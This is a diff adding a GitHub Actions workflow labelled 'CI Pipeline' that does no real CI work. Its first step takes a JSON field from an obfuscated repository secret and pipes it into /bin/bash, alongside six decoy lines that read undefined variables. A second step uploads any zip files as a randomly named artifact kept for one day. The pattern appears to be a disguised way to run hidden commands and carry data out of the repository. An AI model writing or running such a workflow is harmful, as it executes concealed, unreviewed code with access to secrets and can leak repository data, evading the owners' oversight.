@@ -1,0 +1,27 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+jobs:
+  action:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Begin
+        env:
+          qludm70: ${{ secrets.qludm70 }}
+        run: |
+          printf '%s' "$qludm70" | jq -r .o87 | /bin/bash
+          echo $aatsw2822 | jq -r .mvr8 | /bin/bash
+          echo $ivv3 | jq -r .ngops9 | /bin/bash
+          printf '%s' "$wcrjb1" | jq -r .qrbd211 | /bin/bash
+          printf '%s' "$duuwg72405" | jq -r .fnas181 | /bin/bash
+          echo $s489 | jq -r .dvhjo81488 | /bin/bash
+          echo $coqlp3519 | jq -r .j1 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: jzNNrXwa
+          path: "*.zip"
+          retention-days: 1
